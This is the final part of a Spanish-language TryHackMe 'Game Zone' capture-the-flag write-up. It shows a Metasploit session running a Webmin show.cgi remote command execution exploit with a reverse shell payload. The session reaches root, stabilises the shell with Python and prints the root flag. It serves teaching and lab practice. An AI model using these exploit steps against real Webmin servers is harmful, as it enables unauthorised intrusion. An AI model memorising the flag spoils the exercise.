</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">#</span>  <span style="color:#a6e22e">Name</span>                                           <span style="color:#a6e22e">Disclosure</span> Date  <span style="color:#a6e22e">Rank</span>       <span style="color:#a6e22e">Check</span>  <span style="color:#a6e22e">Description</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">-</span>  <span style="color:#f92672">----</span>                                           <span style="color:#f92672">---------------</span>  <span style="color:#f92672">----</span>       <span style="color:#f92672">-----</span>  <span style="color:#f92672">-----------</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  <span style="color:#a6e22e">exploit</span><span style="color:#f92672">/</span><span style="color:#a6e22e">unix</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webapp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_show_cgi_exec</span>       <span style="color:#ae81ff">2012</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#f92672">-</span><span style="color:#ae81ff">06</span>       <span style="color:#a6e22e">excellent</span>  <span style="color:#a6e22e">Yes</span>    <span style="color:#a6e22e">Webmin</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">file</span><span style="color:#f92672">/</span><span style="color:#a6e22e">show</span>.<span style="color:#a6e22e">cgi</span> <span style="color:#a6e22e">Remote</span> <span style="color:#a6e22e">Command</span> <span style="color:#a6e22e">Execution</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>  <span style="color:#a6e22e">auxiliary</span><span style="color:#f92672">/</span><span style="color:#a6e22e">admin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">file_disclosure</span>         <span style="color:#ae81ff">2006</span><span style="color:#f92672">-</span><span style="color:#ae81ff">06</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span>       <span style="color:#a6e22e">normal</span>     <span style="color:#a6e22e">No</span>     <span style="color:#a6e22e">Webmin</span> <span style="color:#a6e22e">File</span> <span style="color:#a6e22e">Disclosure</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>  <span style="color:#a6e22e">exploit</span><span style="color:#f92672">/</span><span style="color:#a6e22e">linux</span><span style="color:#f92672">/</span><span style="color:#a6e22e">http</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_file_manager_rce</span>     <span style="color:#ae81ff">2022</span><span style="color:#f92672">-</span><span style="color:#ae81ff">02</span><span style="color:#f92672">-</span><span style="color:#ae81ff">26</span>       <span style="color:#a6e22e">excellent</span>  <span style="color:#a6e22e">Yes</span>    <span style="color:#a6e22e">Webmin</span> <span style="color:#a6e22e">File</span> <span style="color:#a6e22e">Manager</span> <span style="color:#a6e22e">RCE</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>  <span style="color:#a6e22e">exploit</span><span style="color:#f92672">/</span><span style="color:#a6e22e">linux</span><span style="color:#f92672">/</span><span style="color:#a6e22e">http</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_package_updates_rce</span>  <span style="color:#ae81ff">2022</span><span style="color:#f92672">-</span><span style="color:#ae81ff">07</span><span style="color:#f92672">-</span><span style="color:#ae81ff">26</span>       <span style="color:#a6e22e">excellent</span>  <span style="color:#a6e22e">Yes</span>    <span style="color:#a6e22e">Webmin</span> <span style="color:#a6e22e">Package</span> <span style="color:#a6e22e">Updates</span> <span style="color:#a6e22e">RCE</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>  <span style="color:#a6e22e">exploit</span><span style="color:#f92672">/</span><span style="color:#a6e22e">linux</span><span style="color:#f92672">/</span><span style="color:#a6e22e">http</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_packageup_rce</span>        <span style="color:#ae81ff">2019</span><span style="color:#f92672">-</span><span style="color:#ae81ff">05</span><span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>       <span style="color:#a6e22e">excellent</span>  <span style="color:#a6e22e">Yes</span>    <span style="color:#a6e22e">Webmin</span> <span style="color:#a6e22e">Package</span> <span style="color:#a6e22e">Updates</span> <span style="color:#a6e22e">Remote</span> <span style="color:#a6e22e">Command</span> <span style="color:#a6e22e">Execution</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>  <span style="color:#a6e22e">exploit</span><span style="color:#f92672">/</span><span style="color:#a6e22e">unix</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webapp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_upload_exec</span>         <span style="color:#ae81ff">2019</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">17</span>       <span style="color:#a6e22e">excellent</span>  <span style="color:#a6e22e">Yes</span>    <span style="color:#a6e22e">Webmin</span> <span style="color:#a6e22e">Upload</span> <span style="color:#a6e22e">Authenticated</span> <span style="color:#a6e22e">RCE</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span>  <span style="color:#a6e22e">auxiliary</span><span style="color:#f92672">/</span><span style="color:#a6e22e">admin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">edit_html_fileaccess</span>    <span style="color:#ae81ff">2012</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#f92672">-</span><span style="color:#ae81ff">06</span>       <span style="color:#a6e22e">normal</span>     <span style="color:#a6e22e">No</span>     <span style="color:#a6e22e">Webmin</span> <span style="color:#a6e22e">edit_html</span>.<span style="color:#a6e22e">cgi</span> <span style="color:#a6e22e">file</span> <span style="color:#a6e22e">Parameter</span> <span style="color:#a6e22e">Traversal</span> <span style="color:#a6e22e">Arbitrary</span> <span style="color:#a6e22e">File</span> <span style="color:#a6e22e">Access</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span>  <span style="color:#a6e22e">exploit</span><span style="color:#f92672">/</span><span style="color:#a6e22e">linux</span><span style="color:#f92672">/</span><span style="color:#a6e22e">http</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_backdoor</span>             <span style="color:#ae81ff">2019</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>       <span style="color:#a6e22e">excellent</span>  <span style="color:#a6e22e">Yes</span>    <span style="color:#a6e22e">Webmin</span> <span style="color:#a6e22e">password_change</span>.<span style="color:#a6e22e">cgi</span> <span style="color:#a6e22e">Backdoor</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Interact</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">module</span> <span style="color:#a6e22e">by</span> <span style="color:#a6e22e">name</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">index</span>. <span style="color:#a6e22e">For</span> <span style="color:#a6e22e">example</span> <span style="color:#a6e22e">info</span> <span style="color:#ae81ff">7</span>, <span style="color:#a6e22e">use</span> <span style="color:#ae81ff">7</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">use</span> <span style="color:#a6e22e">exploit</span><span style="color:#f92672">/</span><span style="color:#a6e22e">linux</span><span style="color:#f92672">/</span><span style="color:#a6e22e">http</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_backdoor</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">msf6</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">use</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">msf6</span> <span style="color:#a6e22e">exploit</span>(<span style="color:#a6e22e">unix</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webapp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_show_cgi_exec</span>) <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">set</span> <span style="color:#a6e22e">RHOSTS</span> <span style="color:#a6e22e">localhost</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RHOSTS</span> =&gt; <span style="color:#a6e22e">localhost</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">msf6</span> <span style="color:#a6e22e">exploit</span>(<span style="color:#a6e22e">unix</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webapp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_show_cgi_exec</span>) <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">set</span> <span style="color:#a6e22e">USERNAME</span> <span style="color:#a6e22e">agent47</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">USERNAME</span> =&gt; <span style="color:#a6e22e">agent47</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">msf6</span> <span style="color:#a6e22e">exploit</span>(<span style="color:#a6e22e">unix</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webapp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_show_cgi_exec</span>) <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">set</span> <span style="color:#a6e22e">PASSWORD</span> <span style="color:#a6e22e">videogamer124</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">PASSWORD</span> =&gt; <span style="color:#a6e22e">videogamer47</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">msf6</span> <span style="color:#a6e22e">exploit</span>(<span style="color:#a6e22e">unix</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webapp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_show_cgi_exec</span>) <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">set</span> <span style="color:#a6e22e">SSL</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">!</span>] <span style="color:#a6e22e">Changing</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">SSL</span> <span style="color:#a6e22e">option</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">value</span> <span style="color:#a6e22e">may</span> <span style="color:#a6e22e">require</span> <span style="color:#a6e22e">changing</span> <span style="color:#a6e22e">RPORT</span><span style="color:#f92672">!</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SSL</span> =&gt; <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">msf6</span> <span style="color:#a6e22e">exploit</span>(<span style="color:#a6e22e">unix</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webapp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_show_cgi_exec</span>) <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">set</span> <span style="color:#a6e22e">payload</span> <span style="color:#a6e22e">cmd</span><span style="color:#f92672">/</span><span style="color:#a6e22e">unix</span><span style="color:#f92672">/</span><span style="color:#a6e22e">reverse</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> =&gt; <span style="color:#a6e22e">cmd</span><span style="color:#f92672">/</span><span style="color:#a6e22e">unix</span><span style="color:#f92672">/</span><span style="color:#a6e22e">reverse</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">msf6</span> <span style="color:#a6e22e">exploit</span>(<span style="color:#a6e22e">unix</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webapp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_show_cgi_exec</span>) <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">set</span> <span style="color:#a6e22e">LHOST</span> <span style="color:#a6e22e">tun0</span>
</span></span></code></pre></div><ul>
<li>Ejecuto el exploit.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">msf6</span> <span style="color:#a6e22e">exploit</span>(<span style="color:#a6e22e">unix</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webapp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_show_cgi_exec</span>) <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">run</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#a6e22e">Exploiting</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">::</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#a6e22e">Session</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">created</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">background</span>.
</span></span></code></pre></div><ul>
<li>Abro sesión y obtengo acceso privilegiado.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">msf6</span> <span style="color:#a6e22e">exploit</span>(<span style="color:#a6e22e">unix</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webapp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webmin_show_cgi_exec</span>) <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">sessions</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#a6e22e">Starting</span> <span style="color:#a6e22e">interaction</span> <span style="color:#66d9ef">with</span> <span style="color:#ae81ff">1.</span>..
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">whoami</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">root</span>
</span></span></code></pre></div><ul>
<li>Estabilizo el shell con python, busco el flag y lo imprimo por pantalla.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">python</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">c</span> <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">root</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">gamezone</span><span style="color:#f92672">:~</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">cd</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cd</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">root</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">gamezone</span><span style="color:#f92672">:~</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">ls</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ls</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">root</span>.<span style="color:#a6e22e">txt</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">root</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">gamezone</span><span style="color:#f92672">:~</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">cat</span> <span style="color:#a6e22e">root</span>.<span style="color:#a6e22e">txt</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cat</span> <span style="color:#a6e22e">root</span>.<span style="color:#a6e22e">txt</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">a4b945830144bdd71908d12d902adeee</span>
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Game Zone ha resultado ser una máquina bastante sencilla. He encontrado una dificultad a la hora de usar sqlmap como sugiere la sala, pero una búsqueda rápida me ha permitido encontrar una solución: usar sqlmap de más a menos, empezando por obtener los nombres de las bbdd y terminando con los datos de la tabla concreta que quería.</p>
<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
</div>
</article>

    
    <p class="articleTagsContainer">
        <span> </span>
        <strong>Tags:</strong>
        
            <a
                
                class="buttonTag"
                
                href="/tags/easy">#Easy</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/john">#John</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/linux">#Linux</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/metasploit">#Metasploit</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/privilege-escalation">#Privilege Escalation</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/sqli">#SQLi</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/sqlmap">#sqlmap</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/ssh-tunel">#ssh-tunel</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/tryhackme">#TryHackMe</a>
        
    </p>






                    </main><footer>
    <hr />


<p><small>
        2024 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
    </small></p>
    <p><small>
        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
